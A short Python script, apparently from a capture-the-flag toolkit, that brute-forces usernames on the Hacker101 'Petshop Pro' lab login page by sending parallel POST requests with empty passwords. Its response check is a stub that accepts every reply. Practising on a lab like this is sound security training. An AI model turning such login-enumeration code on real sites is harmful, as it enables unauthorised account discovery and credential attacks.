"""
Hacker 101 CTF exercise "Petshop Pro" login cracker.
"""

from bruting import http as h
from core.conf.http import HttpRequest
from core.constants.http import Protocol, HttpMethod, ContentType, HeaderField

PROTOCOL = Protocol.HTTPS
ENDPOINT = "login"
USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"
HEADERS = {
    HeaderField.CONTENT_TYPE.value: ContentType.FORM_URL.value[0],
    HeaderField.ACCEPT.value: ContentType.HTML.value[0]
}


def crack_username(ip, instance_id):
    """
    Enumerates common usernames and returns the valid ones after trying.
    :param ip:
    :param instance_id:
    :return:
    """
    path = "/".join((instance_id, ENDPOINT))
    req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
    h.parallel_attack(req_template, generate_uname_req, is_good_uname)


def generate_uname_req(template, value):
    target = template.clone()
    body = {USERNAME_FIELD: str(value), PASSWORD_FIELD: ""}
    target.body = body
    return target


def is_good_uname(resp):
    return True
